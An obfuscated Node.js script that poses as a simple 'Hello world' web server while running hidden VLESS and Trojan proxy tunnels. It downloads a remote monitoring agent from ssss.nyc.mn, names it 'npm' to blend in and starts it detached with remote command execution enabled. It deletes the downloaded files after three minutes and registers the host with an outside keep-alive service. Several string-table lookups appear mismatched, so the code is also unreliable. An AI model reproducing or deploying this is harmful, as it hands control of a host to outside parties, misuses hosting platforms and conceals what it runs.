const _0x4e21=['os','http','fs','axios','net','path','crypto','buffer','child_process','ws','UUID','NEZHA_SERVER','NEZHA_PORT','NEZHA_KEY','DOMAIN','AUTO_ACCESS','WSPATH','slice','SUB_PATH','sub','NAME','Hug','PORT','https://speed.cloudflare.com/meta','country','-','asOrganization','Unknown','/','join','index.html','readFile','utf8','writeHead','Content-Type','text/html','end','Hello world!','/','vless://','@',':443?encryption=none&security=tls&sni=','&fp=chrome&type=ws&host=','&path=%2F','#','trojan://','?security=tls&sni=','base64','text/plain','Not Found','replace','8.8.4.4','1.1.1.1','length','https://dns.google/resolve?name=','&type=A','application/dns-json','Status','Answer','type','data','find','every','substr','readUInt8','readUInt16BE','decode','reduce','concat','toString','map','connect','write','pipe','on','createHash','sha224','update','digest','hex','arch','arm','arm64','aarch64','https://arm64.ssss.nyc.mn/v1','https://arm64.ssss.nyc.mn/agent','https://amd64.ssss.nyc.mn/v1','https://amd64.ssss.nyc.mn/agent','npm','createWriteStream','finish','npm download successfully','chmod +x npm','ps aux | grep -v "grep" | grep "./[n]pm"','trim','setsid nohup ./npm -s ','-p','--tls',' --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &','split','pop','true','false','client_secret: ','\ndebug: false\ndisable_auto_update: true\ndisable_command_execute: false\ndisable_force_update: true\ndisable_nat: false\ndisable_send_query: false\ngpu: false\ninsecure_tls: true\nip_report_period: 1800\nreport_delay: 4\nserver: ','\nskip_connection_count: true\nskip_procs_count: true\ntemperature: false\ntls: ','\nuse_gitee_to_upgrade: false\nuse_ipv6_country_code: false\nuuid: ','config.yaml','writeFileSync','setsid nohup ./npm -c config.yaml >/dev/null 2>&1 &','/bin/bash','error','npm running error:','npm is running','https://','https://oooo.serv00.net/add-url','application/json','Automatic Access Task added successfully','unlink','Server is running on port '];
function _0x2a1b(_0x3c4d,_0x5e6f){return _0x4e21[_0x3c4d];}
const os=require(_0x2a1b(0)),http=require(_0x2a1b(1)),fs=require(_0x2a1b(2)),axios=require(_0x2a1b(3)),net=require(_0x2a1b(4)),path=require(_0x2a1b(5)),crypto=require(_0x2a1b(6)),{Buffer}=require(_0x2a1b(7)),{exec,execSync}=require(_0x2a1b(8)),{WebSocket,createWebSocketStream}=require(_0x2a1b(9));
const UUID=process.env[_0x2a1b(10)]||'',NEZHA_SERVER=process.env[_0x2a1b(11)]||'',NEZHA_PORT=process.env[_0x2a1b(12)]||'',NEZHA_KEY=process.env[_0x2a1b(13)]||'',DOMAIN=process.env[_0x2a1b(14)]||'',AUTO_ACCESS=process.env[_0x2a1b(15)]||!0,WSPATH=process.env[_0x2a1b(16)]||UUID[_0x2a1b(17)](0,8),SUB_PATH=process.env[_0x2a1b(18)]||_0x2a1b(19),NAME=process.env[_0x2a1b(20)]||_0x2a1b(21),PORT=process.env[_0x2a1b(22)]||7860;
let ISP='';
const GetISP=async()=>{try{const _0x1f2a=await axios.get(_0x2a1b(23)),_0x3b4c=_0x1f2a[_0x2a1b(61)];ISP=`${_0x3b4c[_0x2a1b(24)]}-${_0x3b4c[_0x2a1b(26)]}`[_0x2a1b(51)](/ /g,'_');}catch(_0x5d6e){ISP=_0x2a1b(27);}};GetISP();
const httpServer=http.createServer((_0x1a2b,_0x3c4d)=>{if(_0x1a2b.url===_0x2a1b(28)){const _0x5e6f=path[_0x2a1b(29)](__dirname,_0x2a1b(30));fs[_0x2a1b(31)](_0x5e6f,_0x2a1b(32),(_0x7f8a,_0x9b0c)=>{if(_0x7f8a){_0x3c4d[_0x2a1b(33)](200,{[_0x2a1b(34)]:_0x2a1b(35)}),_0x3c4d[_0x2a1b(36)](_0x2a1b(37));return;}_0x3c4d[_0x2a1b(33)](200,{[_0x2a1b(34)]:_0x2a1b(35)}),_0x3c4d[_0x2a1b(36)](_0x9b0c);});return;}else if(_0x1a2b.url===`/${SUB_PATH}`){const _0x1d2e=`${_0x2a1b(39)}${UUID}${_0x2a1b(40)}${DOMAIN}${_0x2a1b(41)}${DOMAIN}${_0x2a1b(42)}${DOMAIN}${_0x2a1b(43)}${WSPATH}${_0x2a1b(44)}${NAME}${_0x2a1b(25)}${ISP}`,_0x3f4a=`${_0x2a1b(45)}${UUID}${_0x2a1b(40)}${DOMAIN}:443${_0x2a1b(46)}${DOMAIN}${_0x2a1b(42)}${DOMAIN}${_0x2a1b(43)}${WSPATH}${_0x2a1b(44)}${NAME}${_0x2a1b(25)}${ISP}`,_0x5b6c=_0x1d2e+'\n'+_0x3f4a,_0x7d8e=Buffer.from(_0x5b6c).toString(_0x2a1b(47));_0x3c4d[_0x2a1b(33)](200,{[_0x2a1b(34)]:_0x2a1b(48)}),_0x3c4d[_0x2a1b(36)](_0x7d8e+'\n');}else{_0x3c4d[_0x2a1b(33)](404,{[_0x2a1b(34)]:_0x2a1b(48)}),_0x3c4d[_0x2a1b(36)](_0x2a1b(49)+'\n');}});
const wss=new WebSocket.Server({server:httpServer}),uuid=UUID[_0x2a1b(51)](/-/g,""),DNS_SERVERS=[_0x2a1b(52),_0x2a1b(53)];
function resolveHost(_0x1a2b){return new Promise((_0x3c4d,_0x5e6f)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(_0x1a2b)){_0x3c4d(_0x1a2b);return;}let _0x7f8a=0;function _0x9b0c(){if(_0x7f8a>=DNS_SERVERS[_0x2a1b(54)]){_0x5e6f(new Error(`Failed to resolve ${_0x1a2b}`));return;}const _0x1d2e=DNS_SERVERS[_0x7f8a];_0x7f8a++;const _0x3f4a=`${_0x2a1b(55)}${encodeURIComponent(_0x1a2b)}${_0x2a1b(56)}`;axios.get(_0x3f4a,{timeout:5e3,headers:{'Accept':_0x2a1b(57)}}).then(_0x5b6c=>{const _0x7d8e=_0x5b6c[_0x2a1b(61)];if(_0x7d8e[_0x2a1b(58)]===0&&_0x7d8e[_0x2a1b(59)]&&_0x7d8e[_0x2a1b(59)][_0x2a1b(54)]>0){const _0x9f0a=_0x7d8e[_0x2a1b(59)][_0x2a1b(62)](_0xbf2c=>_0xbf2c[_0x2a1b(60)]===1);if(_0x9f0a){_0x3c4d(_0x9f0a[_0x2a1b(61)]);return;}}_0x9b0c();}).catch(_0xdf4e=>{_0x9b0c();});}_0x9b0c();});}
function handleVlessConnection(_0x1a2b,_0x3c4d){const [_0x5e6f]=_0x3c4d,_0x7f8a=_0x3c4d[_0x2a1b(17)](1,17);if(!_0x7f8a[_0x2a1b(63)]((_0x9b0c,_0x1d2e)=>_0x9b0c==parseInt(uuid[_0x2a1b(64)](_0x1d2e*2,2),16)))return!1;let _0x3f4a=_0x3c4d[_0x2a1b(17)](17,18)[_0x2a1b(65)]()+19;const _0x5b6c=_0x3c4d[_0x2a1b(17)](_0x3f4a,_0x3f4a+=2)[_0x2a1b(66)](0),_0x7d8e=_0x3c4d[_0x2a1b(17)](_0x3f4a,_0x3f4a+=1)[_0x2a1b(65)](),_0x9f0a=_0x7d8e==1?_0x3c4d[_0x2a1b(17)](_0x3f4a,_0x3f4a+=4)[_0x2a1b(29)]('.'):(_0x7d8e==2?new TextDecoder()[_0x2a1b(67)](_0x3c4d[_0x2a1b(17)](_0x3f4a+1,_0x3f4a+=1+_0x3c4d[_0x2a1b(17)](_0x3f4a,_0x3f4a+1)[_0x2a1b(65)]())):(_0x7d8e==3?_0x3c4d[_0x2a1b(17)](_0x3f4a,_0x3f4a+=16)[_0x2a1b(68)]((_0xbf2c,_0xdf4e,_0xef6a,_0xff8b)=>_0xef6a%2?_0xbf2c[_0x2a1b(69)](_0xff8b[_0x2a1b(17)](_0xef6a-1,_0xef6a+1)):_0xbf2c,[])[_0x2a1b(71)](_0xbf2c=>_0xbf2c[_0x2a1b(66)](0)[_0x2a1b(70)](16))[_0x2a1b(29)](':'):''));_0x1a2b.send(new Uint8Array([_0x5e6f,0]));const _0x1e3f=createWebSocketStream(_0x1a2b);return resolveHost(_0x9f0a).then(_0x3a5b=>{net[_0x2a1b(72)]({host:_0x3a5b,port:_0x5b6c},function(){this[_0x2a1b(73)](_0x3c4d[_0x2a1b(17)](_0x3f4a)),_0x1e3f[_0x2a1b(75)](_0x2a1b(120),()=>{})[_0x2a1b(74)](this)[_0x2a1b(75)](_0x2a1b(120),()=>{})[_0x2a1b(74)](_0x1e3f);})[_0x2a1b(75)](_0x2a1b(120),()=>{});}).catch(_0x5c7d=>{net[_0x2a1b(72)]({host:_0x9f0a,port:_0x5b6c},function(){this[_0x2a1b(73)](_0x3c4d[_0x2a1b(17)](_0x3f4a)),_0x1e3f[_0x2a1b(75)](_0x2a1b(120),()=>{})[_0x2a1b(74)](this)[_0x2a1b(75)](_0x2a1b(120),()=>{})[_0x2a1b(74)](_0x1e3f);})[_0x2a1b(75)](_0x2a1b(120),()=>{});}),!0;}
function handleTrojanConnection(_0x1a2b,_0x3c4d){try{if(_0x3c4d[_0x2a1b(54)]<58)return!1;const _0x5e6f=_0x3c4d[_0x2a1b(17)](0,56)[_0x2a1b(70)](),_0x7f8a=[UUID];let _0x9b0c=null;for(const _0x1d2e of _0x7f8a){if(crypto[_0x2a1b(76)](_0x2a1b(77))[_0x2a1b(78)](_0x1d2e)[_0x2a1b(79)](_0x2a1b(80))===_0x5e6f){_0x9b0c=_0x1d2e;break;}}if(!_0x9b0c)return!1;let _0x3f4a=56;if(_0x3c4d[_0x3f4a]===13&&_0x3c4d[_0x3f4a+1]===10)_0x3f4a+=2;if(_0x3c4d[_0x3f4a]!==1)return!1;_0x3f4a+=1;const _0x5b6c=_0x3c4d[_0x3f4a];_0x3f4a+=1;let _0x7d8e,_0x9f0a;if(_0x5b6c===1){_0x7d8e=_0x3c4d[_0x2a1b(17)](_0x3f4a,_0x3f4a+4)[_0x2a1b(29)]('.'),_0x3f4a+=4;}else if(_0x5b6c===3){const _0xbf2c=_0x3c4d[_0x3f4a];_0x3f4a+=1,_0x7d8e=_0x3c4d[_0x2a1b(17)](_0x3f4a,_0x3f4a+_0xbf2c)[_0x2a1b(70)](),_0x3f4a+=_0xbf2c;}else{if(_0x5b6c!==4)return!1;_0x7d8e=_0x3c4d[_0x2a1b(17)](_0x3f4a,_0x3f4a+16)[_0x2a1b(68)]((_0xdf4e,_0xef6a,_0xff8b,_0x1a2b)=>_0xff8b%2?_0xdf4e[_0x2a1b(69)](_0x1a2b[_0x2a1b(17)](_0xff8b-1,_0xff8b+1)):_0xdf4e,[])[_0x2a1b(71)](_0xdf4e=>_0xdf4e[_0x2a1b(66)](0)[_0x2a1b(70)](16))[_0x2a1b(29)](':'),_0x3f4a+=16;}_0x9f0a=_0x3c4d[_0x2a1b(66)](_0x3f4a),_0x3f4a+=2;if(_0x3f4a<_0x3c4d[_0x2a1b(54)]&&_0x3c4d[_0x3f4a]===13&&_0x3c4d[_0x3f4a+1]===10)_0x3f4a+=2;const _0x1e3f=createWebSocketStream(_0x1a2b);return resolveHost(_0x7d8e).then(_0x3a5b=>{net[_0x2a1b(72)]({host:_0x3a5b,port:_0x9f0a},function(){if(_0x3f4a<_0x3c4d[_0x2a1b(54)])this[_0x2a1b(73)](_0x3c4d[_0x2a1b(17)](_0x3f4a));_0x1e3f[_0x2a1b(75)](_0x2a1b(120),()=>{})[_0x2a1b(74)](this)[_0x2a1b(75)](_0x2a1b(120),()=>{})[_0x2a1b(74)](_0x1e3f);})[_0x2a1b(75)](_0x2a1b(120),()=>{});}).catch(_0x5c7d=>{net[_0x2a1b(72)]({host:_0x7d8e,port:_0x9f0a},function(){if(_0x3f4a<_0x3c4d[_0x2a1b(54)])this[_0x2a1b(73)](_0x3c4d[_0x2a1b(17)](_0x3f4a));_0x1e3f[_0x2a1b(75)](_0x2a1b(120),()=>{})[_0x2a1b(74)](this)[_0x2a1b(75)](_0x2a1b(120),()=>{})[_0x2a1b(74)](_0x1e3f);})[_0x2a1b(75)](_0x2a1b(120),()=>{});}),!0;}catch(_0x6d8e){return!1;}}
wss[_0x2a1b(75)](_0x2a1b(72),(_0x1a2b,_0x3c4d)=>{_0x1a2b.once('message',_0x5e6f=>{if(_0x5e6f[_0x2a1b(54)]>17&&_0x5e6f[0]===0){const _0x7f8a=_0x5e6f[_0x2a1b(17)](1,17);if(_0x7f8a[_0x2a1b(63)]((_0x9b0c,_0x1d2e)=>_0x9b0c==parseInt(uuid[_0x2a1b(64)](_0x1d2e*2,2),16))){if(!handleVlessConnection(_0x1a2b,_0x5e6f))_0x1a2b.close();return;}}if(!handleTrojanConnection(_0x1a2b,_0x5e6f))_0x1a2b.close();})[_0x2a1b(75)](_0x2a1b(120),()=>{});});
const getDownloadUrl=()=>{const _0x1a2b=os[_0x2a1b(81)]();return _0x1a2b===_0x2a1b(82)||_0x1a2b===_0x2a1b(83)||_0x1a2b===_0x2a1b(84)?(!NEZHA_PORT?_0x2a1b(85):_0x2a1b(86)):(!NEZHA_PORT?_0x2a1b(87):_0x2a1b(88));},downloadFile=async()=>{if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1a2b=getDownloadUrl(),_0x3c4d=await axios({method:'get',url:_0x1a2b,responseType:'stream'}),_0x5e6f=fs[_0x2a1b(90)](_0x2a1b(89));return _0x3c4d[_0x2a1b(61)][_0x2a1b(74)](_0x5e6f),new Promise((_0x7f8a,_0x9b0c)=>{_0x5e6f[_0x2a1b(75)](_0x2a1b(91),()=>{console.log(_0x2a1b(92)),exec(_0x2a1b(93),_0x1d2e=>{if(_0x1d2e)_0x9b0c(_0x1d2e);_0x7f8a();});}),_0x5e6f[_0x2a1b(75)](_0x2a1b(120),_0x9b0c);});}catch(_0x3f4a){throw _0x3f4a;}},runnz=async()=>{try{const _0x1a2b=execSync(_0x2a1b(94),{encoding:_0x2a1b(32)});if(_0x1a2b[_0x2a1b(95)]()!=='')return;}catch(_0x3c4d){}await downloadFile();let _0x5e6f='',_0x7f8a=['443',_0x2a1b(98),'2096','2087','2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x9b0c=_0x7f8a.includes(NEZHA_PORT)?_0x2a1b(97):'';_0x5e6f=`${_0x2a1b(96)}${NEZHA_SERVER}:${NEZHA_PORT} ${_0x2a1b(97)} ${NEZHA_KEY} ${_0x9b0c}${_0x2a1b(98)}`;}else if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1d2e=NEZHA_SERVER.includes(':')?NEZHA_SERVER[_0x2a1b(99)](':')
[_0x2a1b(100)]():'',_0x3f4a=_0x7f8a.includes(_0x1d2e)?_0x2a1b(101):_0x2a1b(102),_0x5b6c=`${_0x2a1b(103)}${NEZHA_KEY}${_0x2a1b(104)}${NEZHA_SERVER}${_0x2a1b(105)}${_0x3f4a}${_0x2a1b(106)}${UUID}`;fs[_0x2a1b(108)](_0x2a1b(107),_0x5b6c);}_0x5e6f=_0x2a1b(109);}else return;try{exec(_0x5e6f,{shell:_0x2a1b(110)},_0x7d8e=>{_0x7d8e?console.error(_0x2a1b(112),_0x7d8e):console.log(_0x2a1b(113));});}catch(_0x9f0a){console.error(`error: ${_0x9f0a}`);}};async function addAccessTask(){if(!AUTO_ACCESS||!DOMAIN)return;const _0x1a2b=`${_0x2a1b(114)}${DOMAIN}`;try{await axios.post(_0x2a1b(115),{url:_0x1a2b},{headers:{[_0x2a1b(34)]:_0x2a1b(116)}}),console.log(_0x2a1b(117));}catch(_0x3c4d){}}const delFiles=()=>{fs[_0x2a1b(118)](_0x2a1b(89),()=>{}),fs[_0x2a1b(118)](_0x2a1b(107),()=>{});};httpServer.listen(PORT,()=>{runnz(),setTimeout(()=>{delFiles();},18e4),addAccessTask(),console.log(`${_0x2a1b(119)}${PORT}`);});
